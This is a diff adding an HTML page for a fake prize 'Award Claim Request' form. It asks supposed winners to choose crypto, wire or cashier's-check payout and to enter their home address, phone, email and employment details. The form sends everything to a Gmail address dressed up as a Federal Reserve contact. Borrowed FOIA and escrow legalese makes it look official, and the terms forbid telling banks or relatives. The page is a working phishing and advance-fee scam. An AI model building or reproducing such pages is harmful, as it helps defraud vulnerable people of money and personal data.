@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Winner Claim Form</title>
+  <style>
+    :root {
+      --accent:#3e8be9;
+      --accent-2:#5336f7;
+      --bg:#f5f8ff;
+      --surface:#ffffff;
+      --text:#13233d;
+      --muted:#5a6b7f;
+      --danger:#b71c1c;
+    }
+    body { margin:0; font-family:Arial,Helvetica,sans-serif; background:linear-gradient(135deg,#f6fbff 0%,#eef6ff 45%,#fff4f4 100%); color:var(--text); }
+    .container { max-width:900px; margin:32px auto; padding:24px; background:var(--surface); border-radius:16px; box-shadow:0 16px 40px rgba(11,78,135,0.12); }
+    .btn { background:linear-gradient(90deg,var(--accent),#328de7); color:#fff; border:none; padding:10px 16px; border-radius:999px; cursor:pointer; text-decoration:none; display:inline-block; }
+    .btn-danger { background:linear-gradient(90deg,var(--danger),#8f0000); }
+    .card { margin-top:16px; padding:18px; border:1px solid #e9d7d7; border-radius:12px; background:#fffdfd; }
+    .grid { display:grid; grid-template-columns:repeat(2,minmax(220px,1fr)); gap:12px; }
+    label { display:flex; flex-direction:column; gap:6px; font-size:14px; color:#234; }
+    input, textarea, select { padding:10px; border:1px solid #c8d8f0; border-radius:8px; font:inherit; }
+    textarea { min-height:100px; }
+    .option { display:flex; align-items:center; gap:8px; padding:10px 12px; border:1px solid #f0d0d0; border-radius:8px; background:#fff; }
+    .note { color:var(--muted); font-size:13px; line-height:1.6; }
+    .signature-box { border:1px dashed #bfcde3; border-radius:10px; min-height:100px; padding:10px; background:#fcfdff; }
+    .footer { margin-top:20px; text-align:center; color:var(--muted); font-size:13px; }
+    @media (max-width:760px) { .grid { grid-template-columns:1fr; } }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <h1 style="margin-top:0;color:var(--danger);">Award Claim Request</h1>
+    <p class="note">This section is intended for verified winners to enter their claim details.</p>
+
+    <section class="card">
+      <h2 style="margin-top:0;">How would you like to receive your award?</h2>
+      <div class="grid">
+        <label class="option"><input type="radio" name="awardMethod" value="Crypto Currency" /> Crypto Currency</label>
+        <label class="option"><input type="radio" name="awardMethod" value="Wire Transfer" /> Wire Transfer</label>
+        <label class="option"><input type="radio" name="awardMethod" value="Cashier's Check" /> Cashier's Check</label>
+      </div>
+      <div class="grid" style="margin-top:12px;">
+        <label class="option"><input type="radio" name="payoutType" value="Small lump sum" /> Small lump sum</label>
+        <label class="option"><input type="radio" name="payoutType" value="Large lump sum" /> Large lump sum</label>
+      </div>
+    </section>
+
+    <section class="card">
+      <h2 style="margin-top:0;">Terms and Conditions</h2>
+      <p class="note">We are pleased to inform you that we are now offering the convenience of receiving your payments directly to your account. To facilitate this process, we kindly request that you promptly complete the deposit form provided on our website. In addition to filling out the deposit form, we would like to emphasize the critical importance of complying with the Freedom of Information Act (FOIA) regulations and securely retaining your information. By ensuring the accurate and timely completion of the deposit form, you are not only streamlining the payment process but also aiding us in meeting FOIA requirements and safeguarding your data.</p>
+      <p class="note">This is strictly a surprise! To avoid disqualification, winners are not allowed to notify any third party, individual, bank attendant, relatives, or visitors until your prize is safely awarded to your home address. This information is provided to protect each winner from doubt, confusion, or hesitation toward claiming their prize. Only winners can and should have access to this claim document.</p>
+      <label class="option" style="margin-top:10px;"><input type="checkbox" id="confirmTerms" /> I confirm that I have read and accept these terms.</label>
+    </section>
+
+    <section class="card">
+      <h2 style="margin-top:0;">Claim Form</h2>
+      <form action="https://formsubmit.co/ajax/federalreservebankinfo00@gmail.com" method="POST">
+        <input type="hidden" name="_subject" value="New Winner Award Claim" />
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_template" value="table" />
+        <div class="grid">
+          <label>First Name<input type="text" name="firstName" required /></label>
+          <label>Last Name<input type="text" name="lastName" required /></label>
+          <label>Home Address<input type="text" name="homeAddress" required /></label>
+          <label>City<input type="text" name="city" required /></label>
+          <label>State<input type="text" name="state" required /></label>
+          <label>Phone Number<input type="tel" name="phone" required /></label>
+          <label>Email Address<input type="email" name="email" required /></label>
+          <label>Amount Won<input type="text" name="amountWon" required /></label>
+          <label>Date They Were Notified<input type="date" name="dateNotified" required /></label>
+          <label>Name of Their Agent<input type="text" name="agentName" required /></label>
+          <label>Employment Status<select name="employmentStatus">
+            <option value="">Select One</option>
+            <option value="Retired">Retired</option>
+            <option value="Unemployed">Unemployed</option>
+            <option value="Employed">Employed</option>
+            <option value="Part Time">Part Time</option>
+          </select></label>
+          <label>Last Occupation<input type="text" name="lastOccupation" /></label>
+        </div>
+
+        <section class="card" style="margin-top:16px;">
+          <h3 style="margin-top:0;">Terms and Conditions</h3>
+          <p class="note">The Freedom of Information Act (FOIA) provides the ASP Escrow Officer with the right to request access to individual records or information except to the extent that the records are protected from disclosure by any of the nine exemptions contained in the law or by one of three special law enforcement record exclusions. We destroy the information we collect when the purpose for which it was provided has been fulfilled unless we are required to keep it longer by statute or official policy. Electronically submitted information is maintained and destroyed according to the principles of the Federal Records Act and the regulations and records schedules approved by the National Archives and Records Administration. In some cases, information submitted to us may become an agency record and therefore might be subject to a Freedom of Information Act request.</p>
+          <p class="note">We prioritize the privacy and security of your information and assure you that all data provided will be handled with the utmost confidentiality. By proactively completing the deposit form and familiarizing yourself with our information retention policies, you can trust that your payments will be processed smoothly and securely.</p>
+          <label class="option" style="margin-top:10px;"><input type="checkbox" name="agree" required /> I agree to the terms and conditions.</label>
+        </section>
+
+        <section class="card" style="margin-top:16px;">
+          <h3 style="margin-top:0;">Signature</h3>
+          <label>Signature<input type="text" name="signature" placeholder="Type your signature" required /></label>
+          <div class="signature-box" aria-label="Signature area">Signed electronically by the claimant.</div>
+        </section>
+
+        <button class="btn btn-danger" type="submit" style="margin-top:16px;">Submit Claim</button>
+      </form>
+    </section>
+
+    <p class="footer"><a href="index.html" class="btn" style="margin-top:10px;">Back to Home</a></p>
+  </main>
+</body>
+</html>
